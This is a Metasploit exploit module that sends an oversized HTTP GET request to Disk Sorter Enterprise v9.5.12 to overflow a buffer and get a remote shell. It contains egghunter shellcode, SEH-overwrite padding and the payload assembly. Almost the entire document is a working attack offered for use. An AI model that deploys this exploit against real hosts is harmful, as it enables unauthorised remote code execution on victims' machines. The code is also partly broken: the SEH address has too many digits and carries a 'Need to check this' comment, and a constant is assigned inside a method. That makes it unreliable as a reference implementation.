##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Disk Sorter Enterprise\'GET\' Buffer Overflow',
      'Description'    => %q{
          This module exploits a buffer overflow in Disk Sorter enterprise.
          The exploit will wait 10 seconds to get the shell, so don't get impatient
          and cancel it too early.
      },
      'Author'         => 'thecarterb',
      'References'     =>
        [
          [ 'EDB' => '41666' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'BadChars' => "\x00\x09\x0a\x0d\x20"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Disk Sorter Enterprise v9.5.12', { } ] # p/p/r
        ],
      'Privileged'     => false,
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar 22 2017'))

    register_options([Opt::RPORT(80)], self.class)

  end

  def exploit
    junk = 'A' * 2487

    #JMP Short = EB 05
    nSEH = "\x90\x90\xEB\x05" #Jump short 5

    SEH = [0x268525566].pack('L<')  # Need to check this

    egg = "w00tw00t"
    egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    egghunter.concat("\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7") 

    nops = "\x90"

    # The final payload with nops and all the good stuff
    payload_final = junk + nSEH + SEH + egghunter + nops * 10 + egg + payload.encoded + nops * (6000 - junk.length - nSEH.length - SEH.length - egghunter.length - 10 - egg.length - payload.encoded.length)

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => "/#{payload_final}"
      })
    print_status('Waiting for shell...')
    handler
    Rex.sleep(10)
  end
end
